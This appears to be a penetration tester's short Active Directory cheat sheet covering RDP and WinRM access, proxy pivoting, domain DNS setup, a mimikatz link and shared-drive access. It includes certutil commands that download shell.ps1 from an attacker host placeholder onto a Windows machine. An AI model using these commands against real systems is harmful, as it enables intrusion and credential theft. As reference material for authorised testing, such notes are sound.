# Active Directory


RDP to connect to jumphost: `xfreerdp /u:${DOMAIN}\\${user} /p:${password} /cert:ignore /v:$RHOST /smart-sizing`
In order to add a shared drive with `xfreedrp`, use `/drive:tmp,/tmp`.
Note that the shared drive can now be accessed programmatically by using the path `\\tsclient\tmp` on the Windows host.

When pivoting with eg. chisel, it can be used with socks proxy by adding `/proxy:"socks5://127.0.0.1:1080"`.


## evil-winrm

Connect to windows host via WinRM with (from kali)
```
evil-winrm -i ${RHOST} -u ${USER} -p ${PW}
```
special characters might need to be escaped from the password.

## Enumeration

### Initial setup

Set network connection credentials to given user on Windows with:
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```
Commands used for configuring DNS to the domain controller manually in PS:
```
$dnsip = "${DC_IP}"
$index = Get-NetAdapter -Name '${Network_Interface}' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```
`${Network_Interface}` is interface of the network


verify by using nslookup afterwards.


## Post Exploit

[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)


## CMD commands to remember

CMD equivalent of wget
```
certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
```
and choose location by setting the name afterwards:

```
certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1 C:\\Users\\Public\\shell.ps1
```


grep equivalent for cmd: `findstr`

remove a file with force: `del /f`



## Access shared drives

Assuming there is a shared drive on `${COMPUTER_NAME}\shared`, and we have a powershell prompt with access to this shared drive,
we can just do eg `ls ${COMPUTER_NAME}\shared` and other cli commands.

This also works if we have loaded a TGS that grants the access.
